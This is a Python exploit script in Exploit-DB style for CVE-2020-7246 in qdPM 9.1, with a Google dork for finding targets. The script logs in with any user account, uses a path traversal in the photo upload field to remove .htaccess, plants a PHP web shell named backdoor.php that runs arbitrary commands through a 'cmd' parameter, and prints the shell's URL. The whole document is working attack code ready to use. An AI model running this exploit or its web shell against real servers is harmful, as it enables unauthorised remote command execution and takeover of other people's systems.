# Exploit Title: qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)
# Google Dork: intitle:qdPM 9.1. Copyright © 2020 qdpm.net
# Date: 2021-08-03
# Original Exploit Author: Rishal Dwivedi (Loginsoft)
# Original ExploitDB ID: 47954 (https://www.exploit-db.com/exploits/47954)
# Exploit Author: Leon Trappett (thepcn3rd)
# Vendor Homepage: http://qdpm.net/
# Software Link: http://qdpm.net/download-qdpm-free-project-management
# Version: <=1.9.1
# Tested on: Ubuntu Server 20.04 (Python 3.9.2)
# CVE : CVE-2020-7246
# Exploit written in Python 3.9.2
# Tested Environment - Ubuntu Server 20.04 LTS
# Path Traversal + Remote Code Execution
# Exploit modification: RedHatAugust

#!/usr/bin/python3

import sys
import requests
from lxml import html
from argparse import ArgumentParser

session_requests = requests.session()

def multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, uservar):
    request_1 = {
        'sf_method': (None, 'put'),
        'users[id]': (None, userid[-1]),
        'users[photo_preview]': (None, uservar),
        'users[_csrf_token]': (None, csrftoken_[-1]),
        'users[name]': (None, username[-1]),
        'users[new_password]': (None, ''),
        'users[email]': (None, EMAIL),
        'extra_fields[9]': (None, ''),
        'users[remove_photo]': (None, '1'),
        }
    return request_1


def req(userid, username, csrftoken_, EMAIL, HOSTNAME):
    request_1 = multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, '.htaccess')
    new = session_requests.post(HOSTNAME + 'index.php/myAccount/update', files=request_1)
    request_2 = multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, '../.htaccess')
    new1 = session_requests.post(HOSTNAME + 'index.php/myAccount/update', files=request_2)
    request_3 = {
        'sf_method': (None, 'put'),
        'users[id]': (None, userid[-1]),
        'users[photo_preview]': (None, ''),
        'users[_csrf_token]': (None, csrftoken_[-1]),
        'users[name]': (None, username[-1]),
        'users[new_password]': (None, ''),
        'users[email]': (None, EMAIL),
        'extra_fields[9]': (None, ''),
        'users[photo]': ('backdoor.php', '<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }?>', 'application/octet-stream'),
        }
    upload_req = session_requests.post(HOSTNAME + 'index.php/myAccount/update', files=request_3)


def main(HOSTNAME, EMAIL, PASSWORD):
    url = HOSTNAME + '/index.php/login'
    result = session_requests.get(url)
    #print(result.text)
    login_tree = html.fromstring(result.text)
    authenticity_token = list(set(login_tree.xpath("//input[@name='login[_csrf_token]']/@value")))[0]
    payload = {'login[email]': EMAIL, 'login[password]': PASSWORD, 'login[_csrf_token]': authenticity_token}
    result = session_requests.post(HOSTNAME + '/index.php/login', data=payload, headers=dict(referer=HOSTNAME + '/index.php/login'))
    # The designated admin account does not have a myAccount page
    account_page = session_requests.get(HOSTNAME + 'index.php/myAccount')
    account_tree = html.fromstring(account_page.content)
    userid = account_tree.xpath("//input[@name='users[id]']/@value")
    username = account_tree.xpath("//input[@name='users[name]']/@value")
    csrftoken_ = account_tree.xpath("//input[@name='users[_csrf_token]']/@value")
    req(userid, username, csrftoken_, EMAIL, HOSTNAME)
    get_file = session_requests.get(HOSTNAME + 'index.php/myAccount')
    final_tree = html.fromstring(get_file.content)
    backdoor = requests.get(HOSTNAME + "uploads/users/")
    count = 0
    dateStamp = "1970-01-01 00:00"
    backdoorFile = ""
    for line in backdoor.text.split("\n"):
        count = count + 1
        if "backdoor.php" in str(line):
            try:
                start = "\"right\""
                end = " </td"
                line = str(line)
                dateStampNew = line[line.index(start)+8:line.index(end)]
                if (dateStampNew > dateStamp):
                    dateStamp = dateStampNew
                    print("The DateStamp is " + dateStamp)
                    backdoorFile = line[line.index("href")+6:line.index("php")+3]
            except:
                print("Exception occurred")
                continue
        #print(backdoor)
    print('Backdoor uploaded at - > ' + HOSTNAME + 'uploads/users/' + backdoorFile + '?cmd=whoami')

if __name__ == '__main__':
    print("You are not able to use the designated admin account because they do not have a myAccount page.\n")
    parser = ArgumentParser(description='qdmp - Path traversal + RCE Exploit')
    parser.add_argument('-url', '--host', dest='hostname', help='Project URL')
    parser.add_argument('-u', '--email', dest='email', help='User email (Any privilege account)')
    parser.add_argument('-p', '--password', dest='password', help='User password')
    args = parser.parse_args()
    # Added detection if the arguments are passed and populated, if not display the arguments
    if  (len(sys.argv) > 1 and isinstance(args.hostname, str) and isinstance(args.email, str) and isinstance(args.password, str)):
            main(args.hostname, args.email, args.password)
    else:
        parser.print_help()